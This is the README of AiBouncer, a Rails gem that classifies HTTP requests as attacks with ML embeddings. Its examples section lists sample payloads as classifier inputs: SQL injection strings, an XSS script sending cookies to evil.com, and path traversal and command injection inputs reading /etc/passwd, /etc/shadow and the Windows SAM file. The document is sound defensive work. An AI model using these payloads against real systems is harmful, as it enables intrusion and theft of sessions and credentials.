# AiBouncer

[![CI](https://github.com/khasinski/ai_bouncer/actions/workflows/ci.yml/badge.svg)](https://github.com/khasinski/ai_bouncer/actions/workflows/ci.yml)
[![Gem Version](https://badge.fury.io/rb/ai_bouncer.svg)](https://badge.fury.io/rb/ai_bouncer)

AI-powered HTTP request classification for Ruby on Rails. Detect credential stuffing, SQL injection, XSS, and other attacks using ML embeddings.

## Features

- **Fast**: ~2ms inference time (memory mode)
- **Lightweight**: ~31MB total model size
- **Accurate**: 92%+ detection rate on common attacks
- **Flexible Storage**: In-memory or PostgreSQL + pgvector
- **Easy to integrate**: Drop-in middleware or controller concern
- **Configurable**: Protect specific paths, customize responses

## Attack Types Detected

- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Path Traversal
- Command Injection
- Credential Stuffing
- Spam Bots
- Vulnerability Scanners

## Requirements

- Ruby >= 3.2 (required by onnxruntime)
- Rails 6.1+ (optional, for middleware/concern integration)

## Installation

Add to your Gemfile:

```ruby
gem 'ai_bouncer'

# Optional: for database storage mode
gem 'neighbor'
```

Then run the installer:

```bash
bundle install
rails generate ai_bouncer:install
```

This creates `config/initializers/ai_bouncer.rb`. Model files (~31MB) are **auto-downloaded** on first request.

### Manual Download (Optional)

If you prefer to bundle model files with your app:

```bash
# Download from HuggingFace
pip install huggingface_hub
huggingface-cli download khasinski/ai-bouncer --local-dir vendor/ai_bouncer

# Disable auto-download in initializer
config.auto_download = false
```

## Storage Modes

### Memory Mode (Default)

Vectors are kept in memory. Fast and simple.

```ruby
config.storage = :memory
```

**Pros**: ~2ms latency, no database required
**Cons**: ~31MB RAM usage, patterns fixed at deploy time

### Database Mode

Vectors are stored in PostgreSQL using pgvector.

```ruby
config.storage = :database
```

**Pros**: Scalable, add custom patterns at runtime, persistent
**Cons**: ~5ms latency, requires pgvector

#### Database Setup

1. Install pgvector: https://github.com/pgvector/pgvector

2. Generate and run migration:
```bash
rails generate ai_bouncer:migration
rails db:migrate
```

3. Seed the bundled patterns:
```bash
rails ai_bouncer:seed
```

4. Verify:
```bash
rails ai_bouncer:stats
```

## Configuration

```ruby
# config/initializers/ai_bouncer.rb

AiBouncer.configure do |config|
  config.enabled = Rails.env.production?
  config.storage = :memory  # or :database

  # Paths to protect (for middleware)
  config.protected_paths = [
    "/login",
    "/register",
    "/api/*",
  ]

  # Action when attack detected
  config.action = :block  # :block, :challenge, or :log
  config.threshold = 0.3

  # Model files location
  config.model_path = Rails.root.join("vendor", "ai_bouncer")

  # Callback for monitoring
  config.on_attack_detected = ->(request:, classification:, action:) {
    Rails.logger.warn "Attack: #{classification[:label]} from #{request.ip}"
  }
end
```

## Usage

### Option 1: Middleware (Automatic)

The middleware automatically protects configured paths. It extracts method, path, body, user-agent, and params from Rails requests - no manual formatting needed:

```ruby
# A request like this:
# POST /login HTTP/1.1
# User-Agent: Mozilla/5.0...
# Content-Type: application/x-www-form-urlencoded
#
# username=admin'--&password=x

# Is automatically classified as:
# => { label: "sqli", confidence: 0.94, is_attack: true }
```

### Option 2: Controller Concern (Fine-grained)

For more control, use the controller concern:

```ruby
class SessionsController < ApplicationController
  include AiBouncer::ControllerConcern

  # Protect all actions
  protect_from_attacks

  # Or protect specific actions with custom options
  protect_from_attacks only: [:create],
                       threshold: 0.5,
                       action: :block
end
```

Or check manually:

```ruby
class PaymentsController < ApplicationController
  include AiBouncer::ControllerConcern

  def create
    check_for_attack  # Blocks if attack detected

    # Normal flow continues...
  end
end
```

### Option 3: Manual Classification

```ruby
result = AiBouncer.classify(
  AiBouncer.request_to_text(
    method: "POST",
    path: "/login",
    body: "username=admin'--&password=x",
    user_agent: "python-requests/2.28"
  )
)

result
# => {
#   label: "sqli",
#   confidence: 0.94,
#   is_attack: true,
#   latency_ms: 2.1
# }
```

## Adding Custom Patterns (Database Mode)

```ruby
# Add a pattern for a specific attack you've seen
embedding = AiBouncer.model.embed("POST /admin.php?cmd=wget...")

AiBouncer::AttackPattern.create!(
  label: "scanner",
  severity: "high",
  embedding: embedding,
  sample_text: "POST /admin.php?cmd=wget...",
  source: "incident_2024_01"
)
```

## Rake Tasks

```bash
# Download model files manually (auto-download is enabled by default)
rails ai_bouncer:download

# Seed bundled patterns into database (database mode only)
rails ai_bouncer:seed

# Show statistics
rails ai_bouncer:stats

# Test classification
rails ai_bouncer:test

# Benchmark performance
rails ai_bouncer:benchmark
```

## Real-World Examples

### SQL Injection

```ruby
# Authentication bypass
AiBouncer.classify("POST /login username=admin' OR '1'='1 password=x")
# => { label: "sqli", confidence: 0.94, is_attack: true }

# UNION-based data extraction
AiBouncer.classify("GET /users?id=1 UNION SELECT username,password FROM users--")
# => { label: "sqli", confidence: 0.96, is_attack: true }

# Blind SQL injection
AiBouncer.classify("GET /products?id=1 AND SLEEP(5)")
# => { label: "sqli", confidence: 0.91, is_attack: true }
```

### Cross-Site Scripting (XSS)

```ruby
# Script injection in comments
AiBouncer.classify("POST /comments body=<script>document.location='http://evil.com/steal?c='+document.cookie</script>")
# => { label: "xss", confidence: 0.96, is_attack: true }

# Event handler injection
AiBouncer.classify("POST /profile bio=<img src=x onerror=alert('XSS')>")
# => { label: "xss", confidence: 0.93, is_attack: true }

# SVG-based XSS
AiBouncer.classify("POST /upload filename=<svg onload=alert(1)>.svg")
# => { label: "xss", confidence: 0.89, is_attack: true }
```

### Credential Stuffing

```ruby
# Automated login attempts with browser-like UA (common in credential stuffing botnets)
AiBouncer.classify("POST /wp-login.php UA:Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120")
# => { label: "credential_stuffing", confidence: 0.94, is_attack: true }

# High-frequency login pattern
AiBouncer.classify("POST /wp-login.php UA:Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119")
# => { label: "credential_stuffing", confidence: 0.92, is_attack: true }
```

### Spam Bots

```ruby
# Comment spam with referrer pattern
AiBouncer.classify("POST /wp-comments-post.php REF:https://example.com/blog/article UA:Mozilla/5.0 (Windows NT 6.3) Chrome/103")
# => { label: "spam_bot", confidence: 0.91, is_attack: true }

# Old browser version (common in botnets)
AiBouncer.classify("POST /contact UA:Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/56.0.2924.87")
# => { label: "spam_bot", confidence: 0.87, is_attack: true }
```

### Vulnerability Scanners

```ruby
# WordPress plugin scanning with bot UA
AiBouncer.classify("GET /wp-content/plugins/register-plus-redux UA:Mozilla/5.0 Chrome/126")
# => { label: "scanner", confidence: 0.89, is_attack: true }

# Registration page probing with bot UA
AiBouncer.classify("GET /wp-login.php?action=register UA:Go-http-client/2.0")
# => { label: "scanner", confidence: 0.85, is_attack: true }
```

> **Note**: Scanner detection works best when combined with user-agent analysis. Pure path scanning without suspicious UA may be classified as other attack types.

### Path Traversal

```ruby
# Directory traversal to read system files
AiBouncer.classify("GET /files?path=../../../etc/passwd")
# => { label: "path_traversal", confidence: 0.89, is_attack: true }

# Encoded traversal
AiBouncer.classify("GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow")
# => { label: "path_traversal", confidence: 0.87, is_attack: true }

# Windows path traversal
AiBouncer.classify("GET /files?name=....\\....\\....\\windows\\system32\\config\\sam")
# => { label: "path_traversal", confidence: 0.86, is_attack: true }
```

### Command Injection

```ruby
# Shell command in parameter
AiBouncer.classify("GET /ping?host=127.0.0.1;cat /etc/passwd")
# => { label: "command_injection", confidence: 0.93, is_attack: true }

# Backtick injection
AiBouncer.classify("POST /convert filename=`whoami`.pdf")
# => { label: "command_injection", confidence: 0.90, is_attack: true }

# Pipeline injection
AiBouncer.classify("GET /search?q=test|ls -la")
# => { label: "command_injection", confidence: 0.88, is_attack: true }
```

### Clean Requests (No False Positives)

```ruby
# Normal login
AiBouncer.classify("POST /login username=john.doe@example.com password=secretpass123")
# => { label: "clean", confidence: 0.92, is_attack: false }

# Normal API request
AiBouncer.classify("GET /api/users/123")
# => { label: "clean", confidence: 0.91, is_attack: false }

# Paginated API request
AiBouncer.classify("GET /api/products?page=1&limit=20")
# => { label: "clean", confidence: 0.99, is_attack: false }

# Normal form submission
AiBouncer.classify("POST /contact name=John Smith&email=john@example.com&message=Hello")
# => { label: "clean", confidence: 0.95, is_attack: false }
```

## Classification Result

```ruby
{
  label: "sqli",           # Attack type or "clean"
  confidence: 0.94,        # 0.0 - 1.0
  is_attack: true,         # Boolean
  latency_ms: 2.1,         # Inference time
  storage: :memory,        # or :database
  nearest_distance: 0.06,  # Distance to nearest pattern
  neighbors: [             # K nearest neighbors
    { label: "sqli", distance: 0.06 },
    { label: "sqli", distance: 0.08 },
    ...
  ]
}
```

## Performance

Benchmarks on Apple Silicon:

| Mode | Mean | P50 | P99 |
|------|------|-----|-----|
| Memory | 2ms | 2ms | 3ms |
| Database | 5ms | 4ms | 8ms |

## Model Files

Model is hosted on HuggingFace: [khasinski/ai-bouncer](https://huggingface.co/khasinski/ai-bouncer)

Auto-downloaded to `vendor/ai_bouncer/` on first request:

| File | Size | Description |
|------|------|-------------|
| `embedding_model.onnx` | 29 MB | Model2Vec ONNX model |
| `vocab.json` | 550 KB | Tokenizer vocabulary |
| `vectors.bin` | 1.1 MB | Attack pattern vectors (memory mode) |
| `labels.json` | 28 KB | Labels and metadata |

## How It Works

1. **Tokenize**: Request → Unigram tokens
2. **Embed**: Tokens → 256-dim vector (Model2Vec via ONNX)
3. **Search**: Find k=5 nearest attack patterns
4. **Vote**: Weighted voting on attack type
5. **Decide**: Block if confidence > threshold

## Contributing Training Data

**Help make AiBouncer better!** The model currently uses a small dataset (~1,000 patterns) derived from:
- Public security payloads (SecLists, fuzzdb)
- CSIC 2010 HTTP dataset
- A sample of real nginx logs

I'd love to gather more **real-world traffic data** to improve detection accuracy. If you have access to:

- **Attack logs** - Blocked requests from your WAF, failed login attempts, spam submissions
- **Clean traffic** - Normal API requests, legitimate form submissions
- **False positives** - Requests that were incorrectly flagged as attacks

Please consider contributing! You can:

1. **Share anonymized logs** - Remove sensitive data (IPs, emails, passwords) and open an issue
2. **Report misclassifications** - Let me know what the model gets wrong
3. **Add labeled samples** - PRs with new attack patterns are welcome

The more diverse real-world data we have, the better the model becomes for everyone.

Contact: Open an issue at [github.com/khasinski/ai_bouncer](https://github.com/khasinski/ai_bouncer/issues)

## License

MIT License.

## Contributing Code

1. Fork it
2. Create your feature branch
3. Commit your changes
4. Push to the branch
5. Create a Pull Request
